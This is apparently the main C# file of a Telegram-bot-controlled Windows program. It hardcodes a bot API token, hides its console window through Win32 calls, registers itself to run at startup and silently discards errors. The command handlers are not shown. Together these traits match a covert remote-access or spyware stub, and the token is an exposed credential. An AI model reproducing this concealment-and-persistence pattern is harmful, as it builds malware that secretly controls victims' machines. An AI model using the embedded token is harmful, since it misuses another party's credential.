using Telegram.Bot;
using Telegram.Bot.Types;

using System.Drawing.Imaging;
using System;
using System.Runtime.InteropServices;
using BotTG;

namespace BotTg
{
    class program
    {
        public static void Main()
        {
            var botClient = new TelegramBotClient("6221051650:AAGw_MVTwRd5JQQUH2cTxqwFHf9YMiLqhgU");

            botClient.StartReceiving(Functions.Update, Error);
            /*---------------------Hide Console-----------------------------*/
            var handle = GetConsoleWindow();                                //    
            [DllImport("kernel32.dll")]                                     //    
            static extern IntPtr GetConsoleWindow();                        //
            [DllImport("user32.dll")]                                       //
            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);       //
            const int SW_HIDE = 0;                                          //        
            const int SW_SHOW = 5;                                          //    
                                                                            //
            ShowWindow(handle, SW_HIDE);                                    //
            /*--------------------------------------------------------------*/
            Functions.SetAutorunValue(true);
            Console.ReadLine();
        }

        async static Task Error(ITelegramBotClient client, Exception exception, CancellationToken token)
        {
            return;
        }
    }
}